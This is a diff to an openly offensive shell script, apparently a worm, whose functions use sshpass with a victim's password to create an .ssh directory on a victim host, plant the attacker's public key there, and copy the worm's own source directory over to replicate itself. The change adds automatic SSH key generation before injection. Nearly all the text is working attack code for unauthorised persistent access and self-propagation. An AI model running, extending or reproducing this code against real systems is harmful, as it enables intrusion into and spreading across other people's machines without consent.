@@ -7,13 +7,16 @@ usage() {
 
 ssh_key_inject() {
   echo "Launching SSH-Key Inject..."
+  if [ ! -f $public_key ]; then
+    cat /dev/zero | ssh-keygen -q -N ""
+  fi
   sshpass -p "$victim_password" ssh "$victim_ip" -l "$victim_username" "mkdir -m 700 ~/.ssh/"
   sshpass -p "$victim_password" scp "$public_key" "$victim_username"@"$victim_ip":"$key_inject_location"
 }
 
 worm_replicate() {
-echo "Worms Replication through SSH..."
-sshpass -p "$victim_password" scp -r "$src_dir" "$victim_username"@"$victim_ip":"$target_dir"
+  echo "Worms Replication through SSH..."
+  sshpass -p "$victim_password" scp -r "$src_dir" "$victim_username"@"$victim_ip":"$target_dir"
 }
 
 launching_worm() {
